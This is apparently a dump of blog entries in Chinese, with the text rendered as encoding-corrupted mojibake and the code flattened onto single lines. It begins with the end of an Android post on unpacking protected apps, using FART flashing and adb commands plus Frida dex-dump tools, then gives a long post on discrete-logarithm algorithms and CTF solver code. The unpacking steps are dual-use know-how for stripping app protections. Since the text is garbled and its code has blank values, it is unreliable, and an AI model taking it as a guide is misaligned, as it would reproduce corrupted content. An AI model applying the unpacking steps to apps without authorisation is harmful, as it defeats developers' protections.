boot boot.imgfastboot flash cache cache.imgfastboot flash ramdisk ramdisk.imgfastboot reboot 2ã€ä¿®æ”¹fartæ–‡ä»¶å¹¶ä¸Šä¼  å°†farté…ç½®æ–‡ä»¶fartå¤åˆ¶åˆ°/data/fartï¼ˆæ³¨æ„æ–‡ä»¶æƒé™é—®é¢˜ï¼Œå’Œæ¢è¡Œçš„é—®é¢˜ï¼‰ï¼Œå…¶ä¸­ï¼Œfarté…ç½®æ–‡ä»¶ä¸­ä¸ºè¦è„±å£³çš„appåŒ…å 1adb push ~/app_crack/fart/test/fart /data 3ã€æŸ¥çœ‹æ—¥å¿—ç¡®è®¤ 12# åœ¨å‘½ä»¤è¡Œè¾“å…¥ä¸‹é¢çš„å‘½ä»¤ï¼Œç„¶åæ‰“å¼€appadb logcat -s ActivityThread 4ã€æŸ¥çœ‹è„±å‡ºæ¥çš„dex 1adb pull /sdcard/fart/åŒ…å/6600696_dexfile.dex . Fridahttps://github.com/hluwa/FRIDA-DEXDump https://github.com/GuoQiang1993/Frida-Apk-Unpack ä½¿ç”¨ï¼š é»˜å¿µä¸€å£°â€æˆ‘æƒ³è„±ä¸ªå£³â€ã€‚ å¯åŠ¨ APPã€‚ å¯åŠ¨ frida-serverã€‚ python main.pyã€‚ é»˜æ•°ä¸‰ç§’ï¼Œè„±å¥½äº†ã€‚ æˆ–è€…å¯ä»¥å°†è„šæœ¬å°è£…æˆå‘½ä»¤ï¼Œå°±åƒè¿™æ ·ï¼š å…¶ä»–æ–¹æ³•https://github.com/CodingGay/BlackDex https://www.freebuf.com/column/210015.html","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://lazzzaro.github.io/tags/Android/"}],"author":"Lazzaro"},{"title":"ç¦»æ•£å¯¹æ•°","slug":"crypto-ç¦»æ•£å¯¹æ•°","date":"2020-05-07T12:03:21.000Z","updated":"2023-08-24T12:11:41.157Z","comments":true,"path":"2020/05/07/crypto-ç¦»æ•£å¯¹æ•°/","permalink":"https://lazzzaro.github.io/2020/05/07/crypto-%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/","excerpt":"","text":"â€‹ åœ¨æ•´æ•°ä¸­ï¼Œç¦»æ•£å¯¹æ•°ï¼ˆDiscrete Logarithm, DLï¼‰æ˜¯ä¸€ç§åŸºäºåŒä½™è¿ç®—å’ŒåŸæ ¹çš„ä¸€ç§å¯¹æ•°è¿ç®—ã€‚ åœ¨ä»»ä½•ç¾¤ $G$ ä¸­å¯ä¸ºæ‰€æœ‰æ•´æ•° $k$ å®šä¹‰ä¸€ä¸ªå¹‚æ•°ä¸º $b^k$ï¼Œè€Œç¦»æ•£å¯¹æ•° $\\log_ba$ æ˜¯æŒ‡ä½¿å¾— $b^k = a$ çš„æ•´æ•° $k$ã€‚ ç¦»æ•£å¯¹æ•°åœ¨ä¸€äº›ç‰¹æ®Šæƒ…å†µä¸‹å¯ä»¥å¿«é€Ÿè®¡ç®—ã€‚ç„¶è€Œï¼Œé€šå¸¸æ²¡æœ‰å…·éå¸¸æ•ˆç‡çš„æ–¹æ³•æ¥è®¡ç®—å®ƒä»¬ã€‚å…¬é’¥å¯†ç å­¦ä¸­å‡ ä¸ªé‡è¦ç®—æ³•çš„åŸºç¡€ï¼Œæ˜¯å‡è®¾å¯»æ‰¾ç¦»æ•£å¯¹æ•°çš„é—®é¢˜è§£ï¼Œåœ¨ä»”ç»†é€‰æ‹©è¿‡çš„ç¾¤ä¸­ï¼Œå¹¶ä¸å­˜åœ¨æœ‰æ•ˆç‡çš„æ±‚è§£ç®—æ³•ã€‚ â€‹ åŸºæœ¬å®šä¹‰ç”Ÿæˆå…ƒ åœ¨ä¸€ä¸ªç¾¤ $G$ ä¸­ï¼Œå¦‚æœ $g$ æ˜¯ $G$ çš„ç”Ÿæˆå…ƒï¼Œå³æ‰€æœ‰ $G$ ä¸­çš„æ‰€æœ‰å…ƒç´ éƒ½å¯ä»¥è¢«è¡¨ç¤ºæˆ $y=g^x$ï¼Œæ­¤æ—¶çš„ $x$ ç§°ä¸º $y$ åœ¨ $G$ ä¸­çš„å¯¹æ•°ã€‚ é˜¶ è®¾ $m \\ge 1,\\gcd(a,m)=1$ï¼Œä½¿å¾— $a^d \\equiv 1 \\pmod m$ æˆç«‹çš„æœ€å°æ­£æ•´æ•° $d$ ç§°ä¸º $a$ å¯¹æ¨¡ $m$ çš„æŒ‡æ•°æˆ–è€…é˜¶ã€‚ä¸€èˆ¬å°†å…¶è®¡ä¸º $\\delta_m(a)$ã€‚ æ»¡è¶³ $a^d \\equiv 1 \\pmod m$ çš„ $d$ ä¸€å®šæ»¡è¶³ $d \\mid \\varphi(m)$ã€‚ åŸæ ¹ å½“ $\\delta_m(a)=\\varphi(m)$ æ—¶ï¼Œç§° $a$ æ˜¯æ¨¡ $m$ çš„åŸæ ¹ï¼Œç®€ç§° $m$ çš„åŸæ ¹ã€‚ åªæœ‰ $m=2,4,p^\\alpha,2p^\\alpha$ï¼ˆ$p$ ä¸ºå¥‡ç´ æ•°ï¼Œ$\\alpha$ ä¸ºæ­£æ•´æ•°ï¼‰æ—¶ï¼Œæ¨¡ $m$ çš„å‰©ä½™ç³»å­˜åœ¨åŸæ ¹ã€‚ï¼ˆå……è¦æ¡ä»¶ï¼‰ â€‹ å¸¸è§„Sageå‡½æ•°å‚æ•°è¯´æ˜ï¼šæ±‚è§£ä»¥baseä¸ºåº•ï¼Œaçš„å¯¹æ•°ï¼›ordä¸ºbaseçš„é˜¶ï¼Œå¯ä»¥ç¼ºçœï¼Œoperationå¯ä»¥æ˜¯+ä¸*ï¼Œé»˜è®¤ä¸º*ï¼›boundsæ˜¯ä¸€ä¸ªåŒºé—´(ld,ud)ï¼Œéœ€è¦ä¿è¯æ‰€è®¡ç®—çš„å¯¹æ•°åœ¨æ­¤åŒºé—´å†…ã€‚ discrete_log(a,base,ord,operation) é€šç”¨çš„æ±‚ç¦»æ•£å¯¹æ•°çš„æ–¹æ³•ã€‚ discrete_log_rho(a,base,ord,operation) æ±‚ç¦»æ•£å¯¹æ•°çš„Pollard-Rhoç®—æ³•ã€‚ discrete_log_lambda(a,base,bounds,operation) æ±‚ç¦»æ•£å¯¹æ•°çš„Pollard-kangarooç®—æ³•ï¼ˆä¹Ÿç§°ä¸ºlambdaç®—æ³•ï¼‰ã€‚ bsgs(base,a,bounds,operation) å°æ­¥å¤§æ­¥æ³•ã€‚ 12345678910111213141516#ç”Ÿæˆ64ä½çš„ç´ æ•°pä½œä¸ºæ¨¡æ•°ï¼Œintä¸º32ä½ï¼Œè¶…è¿‡intè¦åœ¨æ•°å­—ååŠ Lp=random_prime(2L**64) #å®šä¹‰æœ‰é™åŸŸGF(p)G=GF(p) #æ‰¾ä¸€ä¸ªæ¨¡pçš„åŸæ ¹gp (&#x27;znprimroot(&#x27;+str(p)+&#x27;)&#x27;)#è¾“å‡ºMod(rt,p)ï¼Œåˆ™xæ˜¯æ¨¡pçš„åŸæ ¹g=G(rt) #ç”Ÿæˆç§é’¥x=G(ZZ.random_element(p-1)) #å…¬é’¥y=g^x mod pï¼Œç”±äºå·²ç»å®šä¹‰åœ¨GF(p)ä¸Šï¼Œå› æ­¤g**xå°±æ˜¯g^x mod py=g**x 1234567891011121314151617181920212223#è®¡ç®—DLPçš„é€šç”¨æ–¹æ³•discrete_log(y,g)==x#nä¸ºåˆæ•°ï¼ˆPohlig-Hellmanï¼‰x = discrete_log(mod(b,n),mod(a,n)) #nä¸ºè´¨æ•°æˆ–è´¨æ•°å¹‚ï¼ˆçº¿æ€§ç­›Index Calculusï¼‰R = Integers(99)a = R(4)b = a^9b.log(a)#æˆ–x = int(pari(f&quot;znlog(&#123;int(b)&#125;,Mod(&#123;int(a)&#125;,&#123;int(n)&#125;))&quot;))x = gp.znlog(b, gp.Mod(a, n)) #è®¡ç®—ç¦»æ•£å¯¹æ•°çš„lambdaæ–¹æ³•discrete_log_lambda(y,g,(floor(ZZ(x)/2),2*ZZ(x)))==x #å°æ­¥å¤§æ­¥æ³•è®¡ç®—DLPbsgs(g,y,(floor(ZZ(x)/2),2*ZZ(x)))==x#GF(p)ä¸‹è®¡ç®—DLPF = GF(p)ax = F(b + (a - 1) * A) / F(a * s - s + b)x = discrete_log(F(ax), F(a)) è‡ªæ”¹DLPï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667multiplication_names = ( &#x27;multiplication&#x27;, &#x27;times&#x27;, &#x27;product&#x27;, &#x27;*&#x27;)addition_names = ( &#x27;addition&#x27;, &#x27;plus&#x27;, &#x27;sum&#x27;, &#x27;+&#x27;)def old_discrete_log(a, base, ord=None, operation=&#x27;*&#x27;, identity=None, inverse=None, op=None): b = base from operator import inv, mul, neg, add Z = Integers() if operation in multiplication_names: identity = b.parent()(1) inverse = inv op = mul if ord==None: ord = b.multiplicative_order() elif operation in addition_names: identity = b.parent()(0) inverse = neg op = add if ord==None: ord = b.order() else: if ord==None or identity==None or inverse==None or op==None: print(ord, identity, inverse, op) if ord &lt; 100: c = identity for i in range(ord): if c == a: # is b^i return Z(i) c = op(c,b) m = ord.isqrt()+1 # we need sqrt(ord) rounded up table = dict() # will hold pairs (b^j,j) for j in range(m) g = identity # will run through b**j for j in range(m): if a==g: return Z(j) table[g] = j g = op(g,b) g = inverse(g) # this is now b**(-m) h = op(a,g) # will run through a*g**i = a*b**(-i*m) for i in range(1,m): j = table.get(h) if not j==None: # then a*b**(-i*m) == b**j return Z(i*m + j) if i &lt; m-1: h = op(h,g)def d_log(q): print(&quot;dlogging: &quot;, q) dlogs = [] for f in factors: t = order//f qt = G_mul(q,t) gent = G_mul(gen, t) dlog = old_discrete_log(qt, gent, ord=f, operation=&#x27;NONE&#x27;, op=G_add, identity=zero, inverse=inverse) dlogs.append(dlog) if None in dlogs: raise ValueError(&quot;oh no&quot;) l = CRT_list(dlogs, factors) return lgen = (,)c = (,)k = d_log(c)print(k) â€‹ å¤§æ­¥å°æ­¥ç®—æ³•ï¼ˆBSGSï¼‰å¤§æ­¥å°æ­¥ç®—æ³•å¸¸ç”¨äºæ±‚è§£ç”¨äºè§£å†³è§£é«˜æ¬¡åŒä½™æ–¹ç¨‹çš„é—®é¢˜ï¼Œé—®é¢˜å½¢å¼å¦‚ï¼šæœ‰åŒä½™æ–¹ç¨‹$a^x \\equiv b \\pmod p$ï¼Œ$p$ ä¸ºè´¨æ•°ï¼Œæ±‚æœ€å°éè´Ÿæ•´æ•°è§£ $x$ ä½¿å¾—åŸæ–¹ç¨‹æˆç«‹ã€‚è¿™ç±»é—®é¢˜ä¹Ÿç§°ä¸ºç¦»æ•£å¯¹æ•°é—®é¢˜ã€‚è¯¥ç®—æ³•çš„å¤æ‚åº¦å¯ä»¥è¾¾åˆ°$O(\\sqrt{p}\\log{n})$ç”šè‡³æ›´ä½ã€‚ 12#Sagebsgs(base,a,bounds,operation) 1234567891011121314151617181920212223def babystep_giantstep(g, y, p): m = int((p-1)**0.5 + 0.5) # Baby step table = &#123;&#125; gr = 1 # g^r for r in range(m): table[gr] = r gr = (gr * g) % p # Giant step gm = pow(g, -m, p) # gm = g^&#123;-m&#125; ygqm = y # ygqm = y * g^&#123;-qm&#125; for q in range(m): if ygqm in table: # å³è¾ºã¨å·¦è¾ºãŒä¸€è‡´ã™ã‚‹ã¨ã return q * m + table[ygqm] ygqm = (ygqm * gm) % p return Noneg = y = p = x = babystep_giantstep(g, y, p)print(x)print(pow(g, x, p) == y) â€‹ Pollard Rhoç®—æ³•Pollard Rhoç®—æ³•æ˜¯ä¸€ç§éšæœºæ€§çš„æ¦‚ç‡å‹ç®—æ³•ï¼ŒåŸºäºPRç®—æ³•æˆ‘ä»¬å¯ä»¥åŠ é€Ÿå¤§æ•´æ•°çš„å› å­åˆ†è§£ï¼Œè¿™ä¹Ÿæ˜¯1975å¹´Pollardæå‡ºè¯¥ç®—æ³•æ—¶çš„åº”ç”¨æ–¹é¢ï¼Œè¿™å¯ä»¥ç”¨æ¥æ”»å‡»RSAçš„å…¬é’¥å¯†ç ä½“åˆ¶ï¼Œä¹‹ååœ¨1978å¹´Pollardåˆåˆ©ç”¨å¾ªç¯ç¾¤ $Ï$ å½¢çš„ç‰¹ç‚¹æå‡ºäº†ç”¨äºè§£å†³ç¦»æ•£å¯¹æ•°é—®é¢˜çš„PRç®—æ³•ï¼Œåæ¥ä¹Ÿæ‰©å±•åˆ°äº†æ¤­åœ†æ›²çº¿ä¸Šï¼Œè¿™æ ·PRç®—æ³•ä¾¿æˆåŠŸå¨èƒåˆ°äº†æ•´ä¸ªå…¬é’¥å¯†ç ä½“ç³»ã€‚ è§£å†³ç¦»æ•£å¯¹æ•°é—®é¢˜çš„Pollard Rhoç®—æ³•ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬åœ¨æœ‰é™çš„å¾ªç¯ç¾¤ä¸Šè§£å†³ç¦»æ•£å¯¹æ•°é—®é¢˜ã€‚ç®€å•æ¥çœ‹æˆ‘ä»¬å–ä¸€ä¸ªå¤§ç´ æ•° $P$ï¼Œè®¾ $G$ ä¸ºä¸€ä¸ªä¹˜æ³•çš„å¾ªç¯ç¾¤ï¼Œå…¶ç”Ÿæˆå…ƒä¸º $g$ï¼Œåˆ™è¯¥ç¾¤çš„é˜¶å°±æ˜¯ $N=P-1$ã€‚æ­¤æ—¶åœ¨ $G$ ä¸Šçš„ç¦»æ•£å¯¹æ•°é—®é¢˜å°±æ˜¯å¯¹äº $G$ ä¸­çš„å…ƒç´  $q$ï¼Œæ‰¾åˆ° $x$ ä½¿å¾— $g^x=q$ï¼Œè€ŒPollard Rhoç®—æ³•ä¸»è¦å°±æ˜¯åˆ©ç”¨äº†å¾ªç¯ç¾¤çš„ç”Ÿæˆåºåˆ—å‘ˆç°ä¸€ä¸ª $Ï$ å­—å½¢çŠ¶ã€‚ ä½¿ç”¨Pollard Rhoç®—æ³•åå¯ä»¥å°†æ±‚è§£çš„æ—¶é—´å¤æ‚åº¦é™åˆ° $O(\\sqrt{N})$ï¼Œè‡³äºç©ºé—´å¤æ‚åº¦åˆ™å¯ä»¥å¿½ç•¥ä¸è®¡ï¼Œå› ä¸ºè¯¥ç®—æ³•æ˜¯ä¸ªæ¦‚ç‡å‹ç®—æ³•ï¼Œæ¯æ¬¡åªéšæœºé€‰å–ä¸€å¯¹è¿›è¡Œæ¯”è¾ƒï¼Œæ‰€ä»¥ä¸ä¼šå ç”¨å­˜å‚¨ï¼Œè¿™ä¸å¤§æ­¥å°æ­¥ç®—æ³•ç›¸åï¼Œå…¶å®PRç®—æ³•ä¹Ÿå¯ä»¥çœ‹ä½œæ˜¯å¤§æ­¥å°æ­¥ç®—æ³•çš„éšæœºåŒ–ç‰ˆæœ¬ï¼Œç»§æ‰¿ä»¤æ—¶é—´å¤æ‚åº¦çš„æœ‰ç‚¹ï¼ŒåŒæ—¶è¿˜å‡å°‘äº†ç©ºé—´çš„æ¶ˆè€—ï¼Œå› ä¸ºå¤§æ­¥å°æ­¥ç®—æ³•éœ€è¦å ç”¨å¤§é‡çš„å­˜å‚¨ç©ºé—´ã€‚ æ­¤ç®—æ³•é€‚ç”¨äºç”Ÿæˆå…ƒçš„é˜¶çš„ç´ å› å­éƒ½æ˜¯å¤§æ•°çš„æƒ…å½¢ã€‚ å‚è€ƒï¼šhttps://xz.aliyun.com/t/2780 12#Sagediscrete_log_rho(a,base,ord,operation) 12345678910111213141516171819202122232425262728293031def pollard_rho(g, y, p): q = (p-1) // 2 def new_xab(x, a, b, g, y, p, q): subset = x % 3 if subset == 0: return ((x*x) % p, (a*2) % q, (b*2) % q) if subset == 1: return ((x*g) % p, (a+1) % q, b ) if subset == 2: return ((x*y) % p, a , (b+1) % q) x, a, b = 1, 0, 0 X, A, B = x, a, b for i in range(1, p): x, a, b = new_xab(x, a, b, g, y, p, q) X, A, B = new_xab(X, A, B, g, y, p, q) X, A, B = new_xab(X, A, B, g, y, p, q) if x == X: break res = ((a - A) * pow(B - b, -1, q)) % q if pow(g, res, p) == y: return res if pow(g, res + q, p) == y: return res + q return Noneg = y = p = x = pollard_rho(g, y, p)print(x)print(pow(g, x, p) == y) â€‹ Pohlig-Hellmanç®—æ³•Pohig-Hellmanç®—æ³•æ˜¯ä¸€ç§æ±‚è§£å…‰æ»‘é˜¶å¾ªç¯ç¾¤ä¸Šçš„ç¦»æ•£å¯¹æ•°çš„æ–¹æ³•ã€‚ Pohlig-Hellmanç®—æ³•çš„å¤æ‚åº¦åœ¨ä¸€èˆ¬æƒ…å†µä¸‹æ¯”BSGSç®—æ³•é«˜ï¼Œä½†æ˜¯åœ¨ç‰¹æ®Šæƒ…å†µä¸‹ï¼ˆå¾ªç¯ç¾¤çš„é˜¶æ˜¯å…‰æ»‘æ•°ï¼Œå³å¯ä»¥å› å­åˆ†è§£æˆè¾ƒå°çš„æ•°çš„ä¹˜ç§¯ï¼‰ï¼Œä½¿ç”¨Pohlig-Hellmanèƒ½å–å¾—å¥½çš„æ•ˆæœã€‚è€Œä¸”æœ‰äº›æ—¶å€™ï¼Œå°½ç®¡BSGSèƒ½å¤Ÿå°†å¤æ‚åº¦é™è‡³$\\sqrt{p}$ï¼Œä½†æ˜¯è¿™ä¸ªæ•°ä¾ç„¶å¾ˆå¤§ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨ã€‚è¿™æ—¶å¯ä»¥è€ƒè™‘Pohlig-hellmanæ–¹æ³•èƒ½ä¸èƒ½èµ·ä½œç”¨ã€‚ ç®—æ³•æ€æƒ³ è€ƒè™‘DLPé—®é¢˜ï¼š$a^x \\equiv b \\pmod p$ï¼Œå› ä¸º $p$ æ˜¯å¤§ç´ æ•°ï¼Œæ¨¡ $p$ çš„å¾ªç¯ç¾¤çš„é˜¶æ˜¯ $pâˆ’1$ã€‚å‡è®¾æ¨¡ $p$ çš„æœ€å°çš„æœ¬åŸå…ƒæ˜¯ $g$ï¼ˆæœ¬åŸå…ƒæ˜¯å¯ä»¥æ±‚çš„ï¼‰ï¼Œé‚£ä¹ˆæœ‰ $\\left\\{\\begin{array}{c} a \\equiv g^{aâ€™} \\pmod p \\\\ b \\equiv g^{bâ€™} \\pmod p \\end{array}\\right.$ è¿›ä¸€æ­¥æœ‰ $a^x \\equiv b \\pmod p \\Longleftrightarrow g^{aâ€™x} \\equiv g^{bâ€™} \\pmod p$ï¼Œ æœ‰ $aâ€™x \\equiv bâ€™ \\pmod {p-1}$ï¼Œ å¦‚æœæ±‚å‡ºäº†æ»¡è¶³ä¸Šå¼çš„ $aâ€™$ å’Œ $bâ€™$ ï¼Œé€šè¿‡æ‰©å±•gcdæ–¹æ³•å¯ä»¥æ±‚ä¸€æ¬¡åŒä½™æ–¹ç¨‹çš„è§£å¾—åˆ° $x$ ã€‚ é—®é¢˜å½’ç»“æˆå¦‚ä½•æ±‚ $aâ€™$ å’Œ $bâ€™$ ï¼Œå³åŸæœ¬çš„ä¸€ä¸ªç¦»æ•£å¯¹æ•°é—®é¢˜ï¼Œç°åœ¨å˜æˆä¸¤ä¸ªç¦»æ•£å¯¹æ•°é—®é¢˜ï¼š $\\left\\{\\begin{array}{c} a \\equiv g^{aâ€™} \\pmod p \\\\ b \\equiv g^{bâ€™} \\pmod p \\end{array}\\right.$ ä»¥æ±‚ $aâ€™$ ä¸ºä¾‹ï¼Œè§£DLPé—®é¢˜ï¼š$g^x \\equiv a \\pmod p$ï¼š å°† $p-1$ è¿›è¡Œæ ‡å‡†çš„ç´ å› å­åˆ†è§£ï¼Œå³ $p-1=\\prod\\limits_{i=1}^{m} p_i^{k_i}=p_1^{k_1}p_2^{k_2}p_3^{k_3} \\cdots p_m^{k_m}$ï¼› å¯¹æ¯ä¸ªç´ å› å­ $p_i$ï¼Œå°† $x$ è¡¨ç¤ºæˆ $p_i$ è¿›åˆ¶ï¼Œæœ‰ $x=a_0+a_1p_1+a_2p_2^2+a_3p_3^3+\\dots+a_{k_i-1}p_i^{k_i-1} \\pmod {p_i^{k_i}}$ï¼Œ è¿™æ ·çš„ $p_i$ è¿›åˆ¶è¡¨ç¤ºï¼Œç³»æ•° $a_i$ è‡ªç„¶æ˜¯å°äº $p_i$ï¼› ä»¤ $r=1$ï¼Œæœ‰ $(g^x)^{\\frac{p-1}{p_i^r}} \\equiv a^{\\frac{p-1}{p_i^r}} \\pmod p$ï¼Œå±•å¼€ $x$ æœ‰ $(g^{a_0+a_1p_1+a_2p_2^2+a_3p_3^3+\\dots+a_{k_i-1}p_i^{k_i-1}})^{\\frac{p-1}{p_i^r}} \\equiv a^{\\frac{p-1}{p_i^r}} \\pmod p$ $g^{a_0{\\frac{p-1}{p_i}}} \\cdot g^{a_1(p-1)} \\cdot g^{a_2(p-1)p_i} \\cdots g^{a_{k_i-1}(p-1)p_i^{k_i-2}} \\equiv a^{\\frac{p-1}{p_i}} \\pmod p$ æ³¨æ„ä»ç¬¬äºŒé¡¹å¼€å§‹ï¼Œæ¯ä¸€é¡¹æŒ‡æ•°éƒ½åŒ…å« $pâˆ’1$ï¼ˆç”±è´¹é©¬å°å®šç†çŸ¥ $g^{p-1} \\equiv 1 \\pmod p$ï¼‰ï¼Œæ‰€ä»¥å¼å­å˜æˆ $g^{a_0{\\frac{p-1}{p_i}}} \\equiv a^{\\frac{p-1}{p_i}} \\pmod p$ è¿™ä¸ªå¼å­ä¸­åªæœ‰ $a_0$ æ˜¯æœªçŸ¥çš„ï¼Œå› ä¸º $a_0 \\in [0,p_iâˆ’1]$ï¼Œæ‰€ä»¥å¯ä»¥ç©·ä¸¾å¾—åˆ° $a_0$ çš„å€¼ã€‚ å†ä»¤ $r=2,3,4,\\cdots,k_i$ï¼Œé‡å¤æ­¥éª¤3ï¼Œä¾æ¬¡ç©·ä¸¾æ±‚å‡º $a_1,a_2,\\cdots,a_{k_i-1}$ï¼Œæ•´ä¸ªçš„æ—¶é—´å¤æ‚åº¦æ˜¯ $\\mathrm{O}(p_ik_i)$ã€‚å¯ä»¥å¾—åˆ° $x=a_0+a_1p_1+a_2p_2^2+a_3p_3^3+\\dots+a_{k_i-1}p_i^{k_i-1} \\pmod {p_i^{k_i}}$ é‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼Œå¾—åˆ° $m$ ä¸ªå…³äº $x$ çš„å¼å­ï¼Œåˆ©ç”¨ä¸­å›½å‰©ä½™å®šç†ï¼ˆCRTï¼‰ï¼Œå¯ä»¥è®¡ç®—å‡º $x$ çš„å€¼ã€‚ åˆ©ç”¨è¿™ä¸ªæ–¹æ³•æ±‚å‡º $aâ€™$ å’Œ $bâ€™$ åï¼Œå°±å¯ä»¥å¾—åˆ°åŸDLPé—®é¢˜çš„è§£ã€‚ æ³¨ï¼š Pohlig-Hellmanç®—æ³•æœ€é‡è¦çš„ç‚¹æ˜¯åˆ©ç”¨äº†åŸæ ¹çš„æ€§è´¨ï¼Œå®ƒåªèƒ½è§£å†³ $a \\equiv g^x \\pmod p$ï¼ˆ$g$ æ˜¯åŸæ ¹ï¼‰çš„é—®é¢˜ï¼Œå¯¹äº $g$ ä¸æ˜¯åŸæ ¹çš„æƒ…å†µï¼Œéœ€è¦åˆ©ç”¨åŸæ ¹å°†åŸæ–¹ç¨‹è½¬åŒ–æˆä¸¤ä¸ªå…³äºåŸæ ¹çš„ç¦»æ•£å¯¹æ•°é—®é¢˜ã€‚ æ³¨æ„Pohlig-hellmanåªèƒ½ç”¨äºæ±‚è§£å…‰æ»‘é˜¶ç¾¤ï¼Œä¹Ÿå°±æ˜¯ $p-1$ å¯ä»¥åˆ†è§£æˆå°çš„ç´ å› å­ä¹˜ç§¯ã€‚å¦åˆ™ï¼Œç©·ä¸¾ $a_i$ çš„æ—¶é—´å¤æ‚åº¦ä¾æ—§å¾ˆé«˜ã€‚å¦å¤–å¯ä»¥è€ƒè™‘åœ¨ç©·ä¸¾ $a_i$ æ—¶åˆ©ç”¨å°æ­¥å¤§æ­¥ç®—æ³•ï¼Œè¿›ä¸€æ­¥ä¼˜åˆ’ç®—æ³•å¤æ‚åº¦ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142# Baby-step Giant-stepæ³•def babystep_giantstep(g, y, p, q=None): if q is None: q = p - 1 m = int(q**0.5 + 0.5) # Baby step table = &#123;&#125; gr = 1 # g^r for r in range(m): table[gr] = r gr = (gr * g) % p # Giant step try: gm = pow(g, -m, p) # gm = g^&#123;-m&#125; except: return None ygqm = y # ygqm = y * g^&#123;-qm&#125; for q in range(m): if ygqm in table: return q * m + table[ygqm] ygqm = (ygqm * gm) % p return None# Pohligâ€“Hellmanæ³•def pohlig_hellman_DLP(g, y, p): crt_moduli = [] crt_remain = [] for q, _ in factor(p-1): x = babystep_giantstep(pow(g,(p-1)//q,p), pow(y,(p-1)//q,p), p, q) if (x is None) or (x &lt;= 1): continue crt_moduli.append(q) crt_remain.append(x) x = crt(crt_remain, crt_moduli) return xg = y = p = x = pohlig_hellman_DLP(g, y, p)print(x)print(pow(g, x, p) == y) â€‹ æŒ‡æ•°è®¡ç®—æ³• / Index Calculus Algorithm1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465def is_Bsmooth(b, n): factors = list(factor(int(n))) if len(factors) != 0 and factors[-1][0] &lt;= b: return True, dict(factors) else: return False, dict(factors)def find_congruences(B, g, p, congruences=[]): unique = lambda l: list(set(l)) bases = [] max_equations = prime_pi(B) while True: k = randint(2, p-1) ok, factors = is_Bsmooth(B, pow(g,k,p)) if ok: congruences.append((factors, k)) if len(congruences) &gt;= max_equations: break bases = unique([base for c in [c[0].keys() for c in congruences] for base in c]) return bases, congruencesdef to_matrices(R, bases, congruences): M = [[c[0][base] if base in c[0] else 0 \\ for base in bases] for c in congruences] b = [c[1] for c in congruences] return Matrix(R, M), vector(R, b)def index_calculus(g, y, p, B=None): R = IntegerModRing(p-1) if B is None: B = ceil(exp(0.5*sqrt(2*log(p)*log(log(p))))) bases = [] congruences = [] for i in range(100): bases, congruences = find_congruences(B, g, p, congruences) M, b = to_matrices(R, bases, congruences) try: exponents = M.solve_right(b) break except ValueError: # matrix equation has no solutions continue else: return None # ag^y mod p while True: k = randint(2, p-1) ok, factors = is_Bsmooth(B, (y * pow(g,k,p)) % p) if ok and set(factors.keys()).issubset(bases): print(&#x27;found k = &#123;&#125;&#x27;.format(k)) break print(&#x27;bases:&#x27;, bases) print(&#x27;q:&#x27;, factors.keys()) dlogs = &#123;b: exp for (b,exp) in zip(bases, exponents)&#125; x = (sum(dlogs[q] * e for q, e in factors.items()) - k) % (p-1) if pow(g, x, p) == y: return x return Noneg = y = p = x = index_calculus(g, y, p)print(x)print(pow(g, x, p) == y) â€‹ å¤šé¡¹å¼DLPå‚è€ƒï¼šInCTF 2020 - DLPoly 1234567891011121314151617181920212223242526272829303132333435363738394041424344#Sagedef brute_dlp(gi, ci, n, lim): bi = gi for i in range(1, lim+1): if bi == ci: return i bi = (bi * gi) % n print(&quot;[-] NOT in the range&quot;) print(&quot;[-] Something&#x27;s Wrong, you gotta check the range&quot;, lim)def pohlig_hellman(g, c, s, n, factors): res = [] modulus = [] for q, e in factors: assert pow(g, s//(q**e), n) != 1 gi = pow(g, s//(q**e), n) ci = pow(c, s//(q**e), n) dlogi = brute_dlp(gi, ci, n, q**e) print(&quot;[+] dlog modulo &#123;0&#125; == &#123;1&#125;&quot;.format(q**e, dlogi)) res.append(dlogi) modulus.append(q**e) print(&quot;\\n[*] res = &quot;, res) print(&quot;[*] modulus = &quot;, modulus) dlog = CRT(res, modulus) print(&quot;\\n[+] dlog modulo &#123;0&#125; == &#123;1&#125;&quot;.format(prod(modulus), dlog)) return dlogp = P = PolynomialRing(Zmod(p), name=&#x27;x&#x27;)x = P.gen()n = g = nfactors = n.factor()s = 1for i in nfactors: s *= p**(i[0].degree()) - 1print(s)print(factor(s))qe = dlog = pohlig_hellman(g, c, s, n, qe)flag = bytes.fromhex(hex(dlog)[2:])print(&quot;\\n[*] flag = &quot;, flag.decode()) â€‹ çŸ©é˜µDLPç»™å®š $n$ é˜¶çŸ©é˜µ $G$ï¼Œæ±‚æ»¡è¶³ $G^x=H$ çš„ $x$ å€¼ã€‚ é€šå¸¸çŸ©é˜µçš„ä¹˜æ³•æ˜¯å¤æ‚çš„ï¼Œè€ŒçŸ©é˜µçš„å¹‚å°±æ›´æ˜¯è¿™æ ·äº†ã€‚æ³¨æ„åˆ° $A^n=P(P^{-1}AP^n)P^{-1}$ï¼Œ å¦‚æœèƒ½æ‰¾åˆ°åˆé€‚çš„çŸ©é˜µ $P$ ä½¿å¾— $P^{âˆ’1}AP$ çš„å¹‚æ˜¯ç®€å•çš„ï¼Œå°±æ‰¾åˆ°äº†è®¡ç®—çŸ©é˜µçš„å¹‚ä¹ƒè‡³å¤šé¡¹å¼çš„ç®€ä¾¿æ–¹æ³•ã€‚ä¾‹å¦‚è®¡ç®—å¯¹è§’çŸ©é˜µçš„å¹‚åªéœ€å¯¹åˆ†é‡æ±‚å¹‚ï¼Œè¿™å°±éå¸¸ç®€å•ã€‚ ä½†æ˜¯å¹¶éæ‰€æœ‰çš„ $n$ é˜¶çŸ©é˜µéƒ½å¯ä»¥å¯¹è§’åŒ–ï¼Œç»è¿‡å¤æ‚çš„è®ºè¯ï¼Œå¾—çŸ¥ $n$ é˜¶çŸ©é˜µä¸€å®šæœ‰ Jordan æ ‡å‡†å‹ï¼Œä¹Ÿå°±æ˜¯å¯¹äº $n$ é˜¶çŸ©é˜µ $A$ï¼Œæ„é€ å¯é€†çŸ©é˜µ $P$ ä½¿å¾— 